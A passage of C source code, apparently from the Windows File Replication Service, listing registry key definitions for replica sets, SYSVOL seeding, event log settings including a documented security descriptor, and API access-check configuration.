    {FRS_RKEY_SET_N,        REPLICA_SET_STAGE,       UNITS_NONE,
        REG_SZ,      DT_DIR_PATH,   4,  10*1024, 4, EVENT_FRS_NONE, NULL,
            FKC_SET_N_REPLICA_SET_STAGE, FRS_RKF_READ_AT_START         |
                                         FRS_RKF_RANGE_CHECK           |
                                         FRS_RKF_VALUE_MUST_BE_PRESENT |
                                         FRS_RKF_SYNTAX_CHECK},


    // The replica set type code. ( SYSVOL, DFS, ...)
    // Replica Sets\Guid\Replica Set Type
    {FRS_RKEY_SET_N,        REPLICA_SET_TYPE,       UNITS_NONE,
        REG_SZ,      DT_UNICODE,   2, 1024, 0, EVENT_FRS_NONE, NULL,
            FKC_SET_N_REPLICA_SET_TYPE, FRS_RKF_READ_AT_START         |
                                        FRS_RKF_RANGE_CHECK           |
                                        FRS_RKF_VALUE_MUST_BE_PRESENT},


    //  The directory filter exclusion list.   Default:  None
    //  Don't supply a default here.  See FRS_DS_COMPOSE_FILTER_LIST for why.
    {FRS_RKEY_SET_N,    L"Directory Exclusion Filter List",   UNITS_NONE,
        REG_SZ, DT_FILE_LIST, 0, 0, 0, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_SET_N_DIR_EXCL_FILTER_LIST,   FRS_RKF_READ_AT_START     |
                                              FRS_RKF_LOG_EVENT         |
                                              FRS_RKF_SYNTAX_CHECK      |
                                              FRS_RKF_READ_AT_POLL},


    //  The directory filter inclusion list.         Default:  None
    {FRS_RKEY_SET_N,    L"Directory Inclusion Filter List",     UNITS_NONE,
        REG_SZ, DT_FILE_LIST, 0, 0, 0, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_SET_N_DIR_INCL_FILTER_LIST,   FRS_RKF_READ_AT_START     |
                                              FRS_RKF_LOG_EVENT         |
                                              FRS_RKF_SYNTAX_CHECK      |
                                              FRS_RKF_CREATE_KEY        |
                                              FRS_RKF_OK_TO_USE_DEFAULT |
                                              FRS_RKF_READ_AT_POLL},


    //  The file filter exclusion list.
    //  Don't supply a default here.  See FRS_DS_COMPOSE_FILTER_LIST for why.
    {FRS_RKEY_SET_N,    L"File Exclusion Filter List",    UNITS_NONE,
        REG_SZ, DT_FILE_LIST, 0, 0, 0, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_SET_N_FILE_EXCL_FILTER_LIST,  FRS_RKF_READ_AT_START     |
                                              FRS_RKF_LOG_EVENT         |
                                              FRS_RKF_READ_AT_POLL},


    //  The file filter inclusion list.            Default:  ~clbcatq.*
    {FRS_RKEY_SET_N,    L"File Inclusion Filter List",     UNITS_NONE,
        REG_SZ, DT_FILE_LIST, 0, 0, 0, EVENT_FRS_BAD_REG_DATA,
        L"~clbcatq.*",
            FKC_SET_N_FILE_INCL_FILTER_LIST,  FRS_RKF_READ_AT_START     |
                                              FRS_RKF_LOG_EVENT         |
                                              FRS_RKF_SYNTAX_CHECK      |
                                              FRS_RKF_CREATE_KEY        |
                                              FRS_RKF_OK_TO_USE_DEFAULT |
                                              FRS_RKF_READ_AT_POLL},


    // The tombstone state of this replica set.
    // Replica Sets\Guid\Replica Set Tombstoned
    {FRS_RKEY_SET_N,        REPLICA_SET_TOMBSTONED,       UNITS_NONE,
        REG_DWORD,      DT_BOOL,   0, 1, 0, EVENT_FRS_NONE, NULL,
            FKC_SET_N_REPLICA_SET_TOMBSTONED, FRS_RKF_READ_AT_START         |
                                              FRS_RKF_RANGE_CHECK           |
                                              FRS_RKF_VALUE_MUST_BE_PRESENT},


    // The operation to perform on the replica set.
    // Replica Sets\Guid\Replica Set Command
    {FRS_RKEY_SET_N,        REPLICA_SET_COMMAND,       UNITS_NONE,
        REG_SZ,      DT_UNICODE,   2, 1024, 0, EVENT_FRS_NONE, NULL,
            FKC_SET_N_REPLICA_SET_COMMAND,    FRS_RKF_READ_AT_START         |
                                              FRS_RKF_RANGE_CHECK           |
                                              FRS_RKF_VALUE_MUST_BE_PRESENT},


    // If TRUE this is the first member of a replica set and we init the DB
    // with the contents of the replica tree.
    // Replica Sets\Guid\Replica Set Primary
    {FRS_RKEY_SET_N,        REPLICA_SET_PRIMARY,       UNITS_NONE,
        REG_DWORD,      DT_BOOL,   0, 1, 0, EVENT_FRS_NONE, NULL,
            FKC_SET_N_REPLICA_SET_PRIMARY,    FRS_RKF_READ_AT_START         |
                                              FRS_RKF_RANGE_CHECK           |
                                              FRS_RKF_VALUE_MUST_BE_PRESENT},


    // LDAP error Status return if we have a problem creating sysvol.
    // Replica Sets\Guid\Replica Set Status
    {FRS_RKEY_SET_N,        REPLICA_SET_STATUS,       UNITS_NONE,
        REG_DWORD,      DT_ULONG,   0, MAXLONG, 0, EVENT_FRS_NONE, NULL,
            FKC_SET_N_REPLICA_SET_STATUS,     FRS_RKF_READ_AT_START},


    // Cumulative Replica Sets         *NOTE* This is a key def only.
    {FRS_RKEY_CUM_SET_SECTION,  L"*KeyOnly*",                  UNITS_NONE,
        REG_SZ,        DT_UNICODE,   0, MAXLONG, 0, EVENT_FRS_NONE, NULL,
            FKC_CUMSET_SECTION_KEY,              0},


    // Number of inbound and outbound partners for this replica set.
    // Cumulative Replica Sets\Guid\Number Of Partners
    {FRS_RKEY_CUM_SET_N,  L"Number Of Partners",       UNITS_NONE,
        REG_DWORD,      DT_ULONG,   0, MAXLONG, 0, EVENT_FRS_NONE, NULL,
            FKC_CUMSET_N_NUMBER_OF_PARTNERS,     FRS_RKF_READ_AT_START},


    // Backup / Restore flags for this replica set.
    // Cumulative Replica Sets\Guid\BurFlags
    {FRS_RKEY_CUM_SET_N,  FRS_VALUE_BURFLAGS,       UNITS_NONE,
        REG_DWORD,      DT_ULONG,   0, MAXLONG, 0, EVENT_FRS_NONE, NULL,
            FKC_CUMSET_N_BURFLAGS,     FRS_RKF_READ_AT_START},



 /******************************************************************************
 *******************************************************************************
 **                                                                           **
 **       S y s t e m   V o l u m e   R e l a t e d   K e y s                 **
 **                                                                           **
 **                                                                           **
 *******************************************************************************
 ******************************************************************************/


#define FRS_RKEY_SYSVOL_SET_N           FRS_CONFIG_SECTION L",SysVol,ARG1"
#define FRS_RKEY_SYSVOL_SEED_N          FRS_CONFIG_SECTION L",SysVol Seeding,ARG1"
#define FRS_RKEY_SYSVOL_SEEDING_SECTION FRS_CONFIG_SECTION L",SysVol Seeding"


    //
    // No event log messages are generated for these keys since currently
    // they are only created by the service or NTFRSAPI so if they get
    // fouled up there is nothing the USER can do to correct the problem.
    //


    // TRUE if sysvol is ready.  Notifies NetLogon to publish computer as a DC.
    // Netlogon\\Parameters\SysvolReady
    {NETLOGON_SECTION,        SYSVOL_READY,       UNITS_NONE,
        REG_DWORD,      DT_BOOL,   0, 1, 0, EVENT_FRS_NONE, NULL,
            FKC_SYSVOL_READY,             FRS_RKF_READ_AT_START},


    // SysVol Section        *NOTE* THis is a key only.  It has no value.
    {FRS_SYSVOL_SECTION,         L"*KeyOnly*",       UNITS_NONE,
        REG_SZ,      DT_UNICODE,   2, 10*1024, 0, EVENT_FRS_NONE, NULL,
            FKC_SYSVOL_SECTION_KEY,                               0},


    // TRUE if sysvol data is all present in registry.
    // Tells us that DCPromo completed.
    // NtFrs\Parameters\SysVol\SysVol Information is Committed
    {FRS_SYSVOL_SECTION,        SYSVOL_INFO_IS_COMMITTED,       UNITS_NONE,
        REG_DWORD,      DT_BOOL,   0, 1, 0, EVENT_FRS_NONE, NULL,
            FKC_SYSVOL_INFO_COMMITTED,     FRS_RKF_READ_AT_START         |
                                           FRS_RKF_RANGE_CHECK           |
                                           FRS_RKF_VALUE_MUST_BE_PRESENT},

    //
    //  Note that the following keys are a repeat of those in the "Per-Replica
    //  set" section above except the Key location in the registry is
    //    FRS_CONFIG_SECTION\SysVol instead of FRS_CONFIG_SECTION\Replica Sets
    //  unfortunate but something more to clean up later perhaps with a
    //  second parameter (ARG2).
    //

    // SysVol\<Guid>\Replica Set Name
    {FRS_RKEY_SYSVOL_SET_N,        REPLICA_SET_NAME,       UNITS_NONE,
        REG_SZ,      DT_UNICODE,   4,  512, 0, EVENT_FRS_NONE, NULL,
            FKC_SET_N_SYSVOL_NAME,      FRS_RKF_READ_AT_START         |
                                        FRS_RKF_RANGE_CHECK           |
                                        FRS_RKF_VALUE_MUST_BE_PRESENT},


    // The root of the replica tree.
    // SysVol\<Guid>\Replica Set Root
    {FRS_RKEY_SYSVOL_SET_N,        REPLICA_SET_ROOT,       UNITS_NONE,
        REG_SZ,      DT_DIR_PATH,   4,  10*1024, 4, EVENT_FRS_NONE, NULL,
            FKC_SET_N_SYSVOL_ROOT,      FRS_RKF_READ_AT_START         |
                                        FRS_RKF_RANGE_CHECK           |
                                        FRS_RKF_VALUE_MUST_BE_PRESENT |
                                        FRS_RKF_SYNTAX_CHECK},


    // The staging area for this replica set.
    // SysVol\<Guid>\Replica Set Stage
    {FRS_RKEY_SYSVOL_SET_N,        REPLICA_SET_STAGE,       UNITS_NONE,
        REG_SZ,      DT_DIR_PATH,   4,  10*1024, 4, EVENT_FRS_NONE, NULL,
            FKC_SET_N_SYSVOL_STAGE,      FRS_RKF_READ_AT_START         |
                                         FRS_RKF_RANGE_CHECK           |
                                         FRS_RKF_VALUE_MUST_BE_PRESENT |
                                         FRS_RKF_SYNTAX_CHECK},


    // The replica set type code. ( SYSVOL, DFS, ...)
    // SysVol\<Guid>\Replica Set Type
    {FRS_RKEY_SYSVOL_SET_N,        REPLICA_SET_TYPE,       UNITS_NONE,
        REG_SZ,      DT_UNICODE,   2, 1024, 0, EVENT_FRS_NONE, NULL,
            FKC_SET_N_SYSVOL_TYPE,      FRS_RKF_READ_AT_START         |
                                        FRS_RKF_RANGE_CHECK           |
                                        FRS_RKF_VALUE_MUST_BE_PRESENT},


    //  The directory filter exclusion list.   Default:  None
    //  Don't supply a default here.  See FRS_DS_COMPOSE_FILTER_LIST for why.
    {FRS_RKEY_SYSVOL_SET_N,    L"Directory Exclusion Filter List",   UNITS_NONE,
        REG_SZ, DT_FILE_LIST, 0, 0, 0, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_SET_N_SYSVOL_DIR_EXCL_FILTER_LIST,   FRS_RKF_READ_AT_START     |
                                                     FRS_RKF_LOG_EVENT         |
                                                     FRS_RKF_SYNTAX_CHECK      |
                                                     FRS_RKF_READ_AT_POLL},


    //  The directory filter inclusion list.         Default:  None
    {FRS_RKEY_SYSVOL_SET_N,    L"Directory Inclusion Filter List",     UNITS_NONE,
        REG_SZ, DT_FILE_LIST, 0, 0, 0, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_SET_N_SYSVOL_DIR_INCL_FILTER_LIST,   FRS_RKF_READ_AT_START     |
                                                     FRS_RKF_LOG_EVENT         |
                                                     FRS_RKF_SYNTAX_CHECK      |
                                                     FRS_RKF_CREATE_KEY        |
                                                     FRS_RKF_OK_TO_USE_DEFAULT |
                                                     FRS_RKF_READ_AT_POLL},


    //  The file filter exclusion list.
    //  Don't supply a default here.  See FRS_DS_COMPOSE_FILTER_LIST for why.
    {FRS_RKEY_SYSVOL_SET_N,    L"File Exclusion Filter List",    UNITS_NONE,
        REG_SZ, DT_FILE_LIST, 0, 0, 0, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_SET_N_SYSVOL_FILE_EXCL_FILTER_LIST,  FRS_RKF_READ_AT_START     |
                                                     FRS_RKF_LOG_EVENT         |
                                                     FRS_RKF_READ_AT_POLL},


    //  The file filter inclusion list.            Default:  ~clbcatq.*
    {FRS_RKEY_SYSVOL_SET_N,    L"File Inclusion Filter List",     UNITS_NONE,
        REG_SZ, DT_FILE_LIST, 0, 0, 0, EVENT_FRS_BAD_REG_DATA,
        L"~clbcatq.*",
            FKC_SET_N_SYSVOL_FILE_INCL_FILTER_LIST,  FRS_RKF_READ_AT_START     |
                                                     FRS_RKF_LOG_EVENT         |
                                                     FRS_RKF_SYNTAX_CHECK      |
                                                     FRS_RKF_CREATE_KEY        |
                                                     FRS_RKF_OK_TO_USE_DEFAULT |
                                                     FRS_RKF_READ_AT_POLL},


    // The operation to perform on the replica set.
    // SysVol\<Guid>\Replica Set Command
    {FRS_RKEY_SYSVOL_SET_N,        REPLICA_SET_COMMAND,       UNITS_NONE,
        REG_SZ,      DT_UNICODE,   2, 1024, 0, EVENT_FRS_NONE, NULL,
            FKC_SET_N_SYSVOL_COMMAND,   FRS_RKF_READ_AT_START         |
                                        FRS_RKF_RANGE_CHECK           |
                                        FRS_RKF_VALUE_MUST_BE_PRESENT},


    // The RPC binding string for the parent computer to seed from.
    // SysVol\<Guid>\Replica Set Parent
    {FRS_RKEY_SYSVOL_SET_N,        REPLICA_SET_PARENT,       UNITS_NONE,
        REG_SZ,      DT_UNICODE,   2, 10*1024, 0, EVENT_FRS_NONE, NULL,
            FKC_SET_N_SYSVOL_PARENT,      FRS_RKF_READ_AT_START         |
                                          FRS_RKF_RANGE_CHECK           |
                                          FRS_RKF_VALUE_MUST_BE_PRESENT},


    // If TRUE this is the first member of a replica set and we init the DB
    // with the contents of the replica tree.
    // SysVol\<Guid>\Replica Set Primary
    {FRS_RKEY_SYSVOL_SET_N,        REPLICA_SET_PRIMARY,       UNITS_NONE,
        REG_DWORD,      DT_BOOL,   0, 1, 0,   EVENT_FRS_NONE, NULL,
            FKC_SET_N_SYSVOL_PRIMARY,         FRS_RKF_READ_AT_START         |
                                              FRS_RKF_RANGE_CHECK           |
                                              FRS_RKF_VALUE_MUST_BE_PRESENT},


    // LDAP error Status return if we have a problem creating sysvol.
    // SysVol\<Guid>\Replica Set Status
    {FRS_RKEY_SYSVOL_SET_N,        REPLICA_SET_STATUS,       UNITS_NONE,
        REG_DWORD,      DT_ULONG,   0, MAXLONG, 0, EVENT_FRS_NONE, NULL,
            FKC_SET_N_SYSVOL_STATUS,          FRS_RKF_READ_AT_START},



    // The RPC binding string for the parent computer to seed from.
    // SysVol Seeding\ReplicaSetName(ARG1)\Replica Set Parent
    {FRS_RKEY_SYSVOL_SEED_N,    REPLICA_SET_PARENT,       UNITS_NONE,
        REG_SZ,      DT_UNICODE,   2, 10*1024, 0, EVENT_FRS_NONE, NULL,
            FKC_SYSVOL_SEEDING_N_PARENT,  FRS_RKF_READ_AT_START         |
                                          FRS_RKF_RANGE_CHECK           |
                                          FRS_RKF_VALUE_MUST_BE_PRESENT},


    // SysVol Seeding\ReplicaSetName(ARG1)\Replica Set Name
    {FRS_RKEY_SYSVOL_SEED_N,    REPLICA_SET_NAME,       UNITS_NONE,
        REG_SZ,      DT_UNICODE,   2, 10*1024, 0, EVENT_FRS_NONE, NULL,
            FKC_SYSVOL_SEEDING_N_RSNAME,  FRS_RKF_READ_AT_START         |
                                          FRS_RKF_RANGE_CHECK           |
                                          FRS_RKF_VALUE_MUST_BE_PRESENT},


    // SysVol Seeding        *NOTE* THis is a key only.  It has no value.
    {FRS_RKEY_SYSVOL_SEEDING_SECTION,    L"*KeyOnly*",       UNITS_NONE,
        REG_SZ,      DT_UNICODE,   2, 10*1024, 0, EVENT_FRS_NONE, NULL,
            FKC_SYSVOL_SEEDING_SECTION_KEY,               0},




 /******************************************************************************
 *******************************************************************************
 **                                                                           **
 **       E v e n t   L o g g i n g    C o n f i g   K e y s                  **
 **                                                                           **
 **                                                                           **
 *******************************************************************************
 ******************************************************************************/

#define FRS_RKEY_EVENTLOG         EVENTLOG_ROOT L",ARG1"

#define FRS_RKEY_EVENTLOG_SOURCE  EVENTLOG_ROOT L"," SERVICE_LONG_NAME L",ARG1"

    // EventLog\File Replication Service\File
    {FRS_RKEY_EVENTLOG,        L"File",       UNITS_NONE,
        REG_EXPAND_SZ,      DT_FILENAME,   4, 0, 0, EVENT_FRS_NONE,
        L"%SystemRoot%\\system32\\config\\NtFrs.Evt",
            FKC_EVENTLOG_FILE,            FRS_RKF_READ_AT_START         |
                                          FRS_RKF_CREATE_KEY            |
                                          FRS_RKF_SYNTAX_CHECK          |
                                          FRS_RKF_OK_TO_USE_DEFAULT},


    // EventLog\File Replication Service\DisplayNameFile
    {FRS_RKEY_EVENTLOG,        L"DisplayNameFile",       UNITS_NONE,
        REG_EXPAND_SZ,      DT_FILENAME,   4, 0, 0, EVENT_FRS_NONE,
        L"%SystemRoot%\\system32\\els.dll",
            FKC_EVENTLOG_DISPLAY_FILENAME,FRS_RKF_READ_AT_START         |
                                          FRS_RKF_CREATE_KEY            |
                                          FRS_RKF_SYNTAX_CHECK          |
                                          FRS_RKF_OK_TO_USE_DEFAULT},


    // EventLog\File Replication Service\EventMessageFile
    // EventLog\NTFRS\EventMessageFile
    //      Default value: "%SystemRoot%\system32\ntfrsres.dll"
    {FRS_RKEY_EVENTLOG_SOURCE, L"EventMessageFile",       UNITS_NONE,
        REG_EXPAND_SZ,      DT_FILENAME,   4, 0, 0, EVENT_FRS_NONE,
        DEFAULT_MESSAGE_FILE_PATH,
            FKC_EVENTLOG_EVENT_MSG_FILE,  FRS_RKF_READ_AT_START         |
                                          FRS_RKF_CREATE_KEY            |
                                          FRS_RKF_SYNTAX_CHECK          |
                                          FRS_RKF_OK_TO_USE_DEFAULT},


    // EventLog\File Replication Service\Sources
    {FRS_RKEY_EVENTLOG,        L"Sources",       UNITS_NONE,
        REG_MULTI_SZ,      DT_UNICODE,   4, 0, 0, EVENT_FRS_NONE,
        (SERVICE_NAME L"\0" SERVICE_LONG_NAME L"\0"),
            FKC_EVENTLOG_SOURCES,         FRS_RKF_READ_AT_START         |
                                          FRS_RKF_CREATE_KEY            |
                                          FRS_RKF_OK_TO_USE_DEFAULT},


    // EventLog\File Replication Service\Retention
    {FRS_RKEY_EVENTLOG,        L"Retention",       UNITS_NONE,
        REG_DWORD,         DT_ULONG,   0, MAXLONG, 0, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_EVENTLOG_RETENTION,       FRS_RKF_READ_AT_START         |
                                          FRS_RKF_LOG_EVENT             |
                                          FRS_RKF_CREATE_KEY            |
                                          FRS_RKF_OK_TO_USE_DEFAULT},


    // EventLog\File Replication Service\MaxSize
    {FRS_RKEY_EVENTLOG,        L"MaxSize",       UNITS_NONE,
        REG_DWORD,         DT_ULONG,   0, MAXLONG, 0x80000, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_EVENTLOG_MAXSIZE,         FRS_RKF_READ_AT_START         |
                                          FRS_RKF_LOG_EVENT             |
                                          FRS_RKF_CREATE_KEY            |
                                          FRS_RKF_OK_TO_USE_DEFAULT},


    // EventLog\File Replication Service\DisplayNameID
    {FRS_RKEY_EVENTLOG,        L"DisplayNameID",       UNITS_NONE,
        REG_DWORD,         DT_ULONG,   0, MAXLONG, 259, EVENT_FRS_NONE, NULL,
            FKC_EVENTLOG_DISPLAY_NAMEID,  FRS_RKF_READ_AT_START         |
                                          FRS_RKF_CREATE_KEY            |
                                          FRS_RKF_OK_TO_USE_DEFAULT},

    // EventLog\File Replication Service\CustomSD
    // CustomSD that is used to protect the FRS log. It is essentially the default SD
    // that is used to protect the custom logs, with "restrict guest access" option.
    // The following permission bits are in use:
    //      READ=0x1, WRITE=0x2, CLEAR=0x4, BACKUP=0x20
    //
    // The SD is as follows:
    //  Owner/Group = Local system
    //  DACL:
    //   Deny:  Full control,       Anonymous
    //   Deny:  Full control,       Domain Guests
    //   Allow: Full control,       Local system
    //   Allow: Read|Clear,         Builtin Admins
    //   Allow: Backup,             Backup operators
    //   Allow: Read|Clear,         System operators
    //   Allow: Read,               Everyone
    //   Allow: Write,              Local service
    //   Allow: Write,              Network service
    //
    // The resultant string is: O:SYG:SYD:(D;;0x27;;;AN)(D;;0x27;;;DG)(A;;0x27;;;SY)(A;;0x5;;;BA)(A;;0x20;;;BO)(A;;0x5;;;SO)(A;;0x1;;;WD)(A;;0x2;;;LS)(A;;0x2;;;NS)

    {FRS_RKEY_EVENTLOG,        L"CustomSD",       UNITS_NONE,
        REG_EXPAND_SZ,      DT_UNICODE,   4, 0, 0, EVENT_FRS_NONE,
        L"O:SYG:SYD:(D;;0x27;;;AN)(D;;0x27;;;DG)(A;;0x27;;;SY)(A;;0x5;;;BA)(A;;0x20;;;BO)(A;;0x5;;;SO)(A;;0x1;;;WD)(A;;0x2;;;LS)(A;;0x2;;;NS)",
            FKC_EVENTLOG_CUSTOM_SD,FRS_RKF_READ_AT_START         |
                                          FRS_RKF_CREATE_KEY            |
                                          FRS_RKF_SYNTAX_CHECK          |
                                          FRS_RKF_OK_TO_USE_DEFAULT},

    // EventLog\File Replication Service\TypesSupported
    {FRS_RKEY_EVENTLOG_SOURCE,  L"TypesSupported",       UNITS_NONE,
        REG_DWORD,         DT_ULONG,   0, MAXLONG, FRS_EVENT_TYPES, EVENT_FRS_NONE, NULL,
            FKC_EVENTLOG_TYPES_SUPPORTED, FRS_RKF_READ_AT_START         |
                                          FRS_RKF_CREATE_KEY            |
                                          FRS_RKF_OK_TO_USE_DEFAULT},


 /******************************************************************************
 *******************************************************************************
 **                                                                           **
 **       F R S   A P I   A c c e s s   C h e c k   K e y s                   **
 **                                                                           **
 **                                                                           **
 *******************************************************************************
 ******************************************************************************/


#define  FRS_RKEY_ACCCHK_PERFMON  \
    FRS_CONFIG_SECTION  L",Access Checks,"  ACK_COLLECT_PERFMON_DATA

    // Access Checks\Get Perfmon Data\Access checks are [Enabled or Disabled]
    {FRS_RKEY_ACCCHK_PERFMON,   ACCESS_CHECKS_ARE,       UNITS_NONE,
        REG_SZ,      DT_ACCESS_CHK,   2, 200, 0, EVENT_FRS_BAD_REG_DATA,
        ACCESS_CHECKS_ARE_DEFAULT_ENABLED,
            FKC_ACCCHK_PERFMON_ENABLE,  FRS_RKF_READ_AT_START         |
                                        FRS_RKF_LOG_EVENT             |
                                        FRS_RKF_CREATE_KEY            |
                                        FRS_RKF_SYNTAX_CHECK          |
                                        FRS_RKF_RANGE_CHECK},


    // Access Checks\Get Perfmon Data\Access checks require [Full Control or Read]
    {FRS_RKEY_ACCCHK_PERFMON,   ACCESS_CHECKS_REQUIRE,       UNITS_NONE,
        REG_SZ,      DT_ACCESS_CHK,   2, 200, 0, EVENT_FRS_BAD_REG_DATA,
        ACCESS_CHECKS_REQUIRE_DEFAULT_READ,
            FKC_ACCCHK_PERFMON_RIGHTS,  FRS_RKF_READ_AT_START         |
                                        FRS_RKF_LOG_EVENT             |
                                        FRS_RKF_CREATE_KEY            |
                                        FRS_RKF_SYNTAX_CHECK          |
                                        FRS_RKF_RANGE_CHECK},


#define  FRS_RKEY_ACCCHK_GETDS_POLL  \
    FRS_CONFIG_SECTION  L",Access Checks," ACK_GET_DS_POLL

    // Access Checks\Get Ds Polling Interval\Access checks are [Enabled or Disabled]
    {FRS_RKEY_ACCCHK_GETDS_POLL,   ACCESS_CHECKS_ARE,       UNITS_NONE,
        REG_SZ,      DT_ACCESS_CHK,   2, 200, 0, EVENT_FRS_BAD_REG_DATA,
        ACCESS_CHECKS_ARE_DEFAULT_ENABLED,
            FKC_ACCCHK_GETDS_POLL_ENABLE,   FRS_RKF_READ_AT_START         |
                                            FRS_RKF_LOG_EVENT             |
                                            FRS_RKF_CREATE_KEY            |
                                            FRS_RKF_SYNTAX_CHECK          |
                                            FRS_RKF_RANGE_CHECK},


    // Access Checks\Get Ds Polling Interval\Access checks require [Full Control or Read]
    {FRS_RKEY_ACCCHK_GETDS_POLL,   ACCESS_CHECKS_REQUIRE,       UNITS_NONE,
        REG_SZ,      DT_ACCESS_CHK,   2, 200, 0, EVENT_FRS_BAD_REG_DATA,
        ACCESS_CHECKS_REQUIRE_DEFAULT_READ,
            FKC_ACCCHK_GETDS_POLL_RIGHTS,   FRS_RKF_READ_AT_START         |
                                            FRS_RKF_LOG_EVENT             |
                                            FRS_RKF_CREATE_KEY            |
                                            FRS_RKF_SYNTAX_CHECK          |
                                            FRS_RKF_RANGE_CHECK},



#define  FRS_RKEY_ACCCHK_GET_INFO  \
    FRS_CONFIG_SECTION  L",Access Checks," ACK_INTERNAL_INFO

    // Access Checks\Get Internal Information\Access checks are [Enabled or Disabled]
    {FRS_RKEY_ACCCHK_GET_INFO,   ACCESS_CHECKS_ARE,       UNITS_NONE,
        REG_SZ,      DT_ACCESS_CHK,   2, 200, 0, EVENT_FRS_BAD_REG_DATA,
        ACCESS_CHECKS_ARE_DEFAULT_ENABLED,
            FKC_ACCCHK_GET_INFO_ENABLE,     FRS_RKF_READ_AT_START         |
                                            FRS_RKF_LOG_EVENT             |
                                            FRS_RKF_CREATE_KEY            |
                                            FRS_RKF_SYNTAX_CHECK          |
                                            FRS_RKF_RANGE_CHECK},


    // Access Checks\Get Internal Information\Access checks require [Full Control or Read]
    {FRS_RKEY_ACCCHK_GET_INFO,   ACCESS_CHECKS_REQUIRE,       UNITS_NONE,
        REG_SZ,      DT_ACCESS_CHK,   2, 200, 0, EVENT_FRS_BAD_REG_DATA,
        ACCESS_CHECKS_REQUIRE_DEFAULT_WRITE,
            FKC_ACCCHK_GET_INFO_RIGHTS,     FRS_RKF_READ_AT_START         |
                                            FRS_RKF_LOG_EVENT             |
                                            FRS_RKF_CREATE_KEY            |
                                            FRS_RKF_SYNTAX_CHECK          |
                                            FRS_RKF_RANGE_CHECK},



#define  FRS_RKEY_ACCCHK_SETDS_POLL    \
    FRS_CONFIG_SECTION  L",Access Checks,"  ACK_SET_DS_POLL

    // Access Checks\set Ds Polling Interval\Access checks are [Enabled or Disabled]
    {FRS_RKEY_ACCCHK_SETDS_POLL,   ACCESS_CHECKS_ARE,       UNITS_NONE,
        REG_SZ,      DT_ACCESS_CHK,   2, 200, 0, EVENT_FRS_BAD_REG_DATA,
        ACCESS_CHECKS_ARE_DEFAULT_ENABLED,
            FKC_ACCCHK_SETDS_POLL_ENABLE,   FRS_RKF_READ_AT_START         |
                                            FRS_RKF_LOG_EVENT             |
                                            FRS_RKF_CREATE_KEY            |
                                            FRS_RKF_SYNTAX_CHECK          |
                                            FRS_RKF_RANGE_CHECK},


    // Access Checks\Set Ds Polling Interval\Access checks require [Full Control or Read]
    {FRS_RKEY_ACCCHK_SETDS_POLL,   ACCESS_CHECKS_REQUIRE,       UNITS_NONE,
        REG_SZ,      DT_ACCESS_CHK,   2, 200, 0, EVENT_FRS_BAD_REG_DATA,
        ACCESS_CHECKS_REQUIRE_DEFAULT_WRITE,
            FKC_ACCCHK_SETDS_POLL_RIGHTS,   FRS_RKF_READ_AT_START         |
                                            FRS_RKF_LOG_EVENT             |
                                            FRS_RKF_CREATE_KEY            |
                                            FRS_RKF_SYNTAX_CHECK          |
                                            FRS_RKF_RANGE_CHECK},




#define  FRS_RKEY_ACCCHK_STARTDS_POLL  \
    FRS_CONFIG_SECTION  L",Access Checks,"  ACK_START_DS_POLL

    // Access Checks\Start Ds Polling\Access checks are [Enabled or Disabled]
    {FRS_RKEY_ACCCHK_STARTDS_POLL,   ACCESS_CHECKS_ARE,       UNITS_NONE,
        REG_SZ,      DT_ACCESS_CHK,   2, 200, 0, EVENT_FRS_BAD_REG_DATA,
        ACCESS_CHECKS_ARE_DEFAULT_ENABLED,
            FKC_ACCCHK_STARTDS_POLL_ENABLE,  FRS_RKF_READ_AT_START         |
                                             FRS_RKF_LOG_EVENT             |
                                             FRS_RKF_CREATE_KEY            |
                                             FRS_RKF_SYNTAX_CHECK          |
                                             FRS_RKF_RANGE_CHECK},


    // Access Checks\Start Ds Polling\Access checks require [Full Control or Read]
    {FRS_RKEY_ACCCHK_STARTDS_POLL,   ACCESS_CHECKS_REQUIRE,       UNITS_NONE,
        REG_SZ,      DT_ACCESS_CHK,   2, 200, 0, EVENT_FRS_BAD_REG_DATA,
        ACCESS_CHECKS_REQUIRE_DEFAULT_READ,
            FKC_ACCCHK_STARTDS_POLL_RIGHTS,  FRS_RKF_READ_AT_START         |
                                             FRS_RKF_LOG_EVENT             |
                                             FRS_RKF_CREATE_KEY            |
                                             FRS_RKF_SYNTAX_CHECK          |
                                             FRS_RKF_RANGE_CHECK},




#define  FRS_RKEY_ACCCHK_DCPROMO  \
    FRS_CONFIG_SECTION  L",Access Checks,"  ACK_DCPROMO

    // Access Checks\dcpromo\Access checks are [Enabled or Disabled]
    {FRS_RKEY_ACCCHK_DCPROMO,   ACCESS_CHECKS_ARE,       UNITS_NONE,
        REG_SZ,      DT_ACCESS_CHK,   2, 200, 0, EVENT_FRS_BAD_REG_DATA,
        ACCESS_CHECKS_ARE_DEFAULT_ENABLED,
            FKC_ACCESS_CHK_DCPROMO_ENABLE,  FRS_RKF_READ_AT_START         |
                                            FRS_RKF_LOG_EVENT             |
                                            FRS_RKF_CREATE_KEY            |
                                            FRS_RKF_SYNTAX_CHECK          |
                                            FRS_RKF_RANGE_CHECK},


    // Access Checks\dcpromo\Access checks require [Full Control or Read]
    {FRS_RKEY_ACCCHK_DCPROMO,   ACCESS_CHECKS_REQUIRE,       UNITS_NONE,
        REG_SZ,      DT_ACCESS_CHK,   2, 200, 0, EVENT_FRS_BAD_REG_DATA,
        ACCESS_CHECKS_REQUIRE_DEFAULT_WRITE,
            FKC_ACCESS_CHK_DCPROMO_RIGHTS,  FRS_RKF_READ_AT_START         |
                                            FRS_RKF_LOG_EVENT             |
                                            FRS_RKF_CREATE_KEY            |
                                            FRS_RKF_SYNTAX_CHECK          |
                                            FRS_RKF_RANGE_CHECK},




#define  FRS_RKEY_ACCCHK_IS_PATH_REPLICATED  \
    FRS_CONFIG_SECTION  L",Access Checks,"  ACK_IS_PATH_REPLICATED

    // Access Checks\Is Path Replicated\Access checks are [Enabled or Disabled]
    {FRS_RKEY_ACCCHK_IS_PATH_REPLICATED,   ACCESS_CHECKS_ARE,       UNITS_NONE,
        REG_SZ,      DT_ACCESS_CHK,   2, 200, 0, EVENT_FRS_BAD_REG_DATA,
        ACCESS_CHECKS_ARE_DEFAULT_ENABLED,
